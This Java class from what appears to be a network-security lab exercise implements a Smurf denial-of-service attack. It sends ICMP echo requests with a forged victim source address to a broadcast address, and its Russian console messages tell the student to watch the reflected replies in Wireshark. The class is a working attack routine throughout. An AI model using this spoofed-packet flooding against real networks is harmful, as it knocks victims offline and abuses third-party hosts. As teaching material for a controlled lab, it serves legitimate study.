package org.example.lab5;

import java.net.InetAddress;
import java.net.UnknownHostException;

public final class SmurfWorker implements Runnable {
    private final NativeSockets sockets;
    private final String victimHost;
    private final String broadcastHost;
    private final int count;
    private final int intervalMs;

    public SmurfWorker(
            NativeSockets sockets,
            String victimHost,
            String broadcastHost,
            int count,
            int intervalMs
    ) {
        this.sockets = sockets;
        this.victimHost = victimHost;
        this.broadcastHost = broadcastHost;
        this.count = count;
        this.intervalMs = intervalMs;
    }

    @Override
    public void run() {
        InetAddress victim = resolve(victimHost);
        InetAddress broadcast = resolve(broadcastHost);
        if (victim == null || broadcast == null) {
            return;
        }
        int identifier = IcmpIdentifiers.next();
        Console.println("Smurf (учебный стенд): ICMP Echo на broadcast с подменой источника");
        Console.println("  Жертва (IP источника в пакете): " + victim.getHostAddress());
        Console.println("  Broadcast (назначение): " + broadcast.getHostAddress());
        Console.println("  Запросов: " + count);
        Console.println("На машине жертвы включите Wireshark, фильтр: icmp.");
        Console.println("Ожидаются ICMP Echo Reply, приходящие на IP жертвы.");
        if (System.getProperty("os.name", "").toLowerCase().contains("win")) {
            Console.println("Windows может блокировать подмену IP источника; если на жертве тишина — "
                    + "уточните у преподавателя (Linux-атакующий или ослабление фильтра).");
        }
        for (int sequence = 1; sequence <= count; sequence++) {
            long sentAt = System.currentTimeMillis();
            byte[] icmp = IcmpMessage.echoRequest(identifier, sequence, sentAt);
            byte[] datagram = IPv4Datagram.icmpEchoRequest(victim, broadcast, icmp);
            try {
                sockets.sendSmurfDatagram(datagram, broadcast);
                Console.println("Отправлен smurf seq=" + sequence + " (src="
                        + victim.getHostAddress() + " -> " + broadcast.getHostAddress() + ")");
            } catch (IcmpException e) {
                Console.println("Ошибка отправки seq=" + sequence + ": " + e.getMessage());
                return;
            }
            pause(intervalMs);
        }
        Console.println("Готово. Проверьте захват на узле " + victim.getHostAddress() + ".");
    }

    private static InetAddress resolve(String host) {
        try {
            return InetAddress.getByName(host);
        } catch (UnknownHostException e) {
            Console.println("Неизвестный адрес: " + host);
            return null;
        }
    }

    private static void pause(int intervalMs) {
        if (intervalMs <= 0) {
            return;
        }
        try {
            Thread.sleep(intervalMs);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}
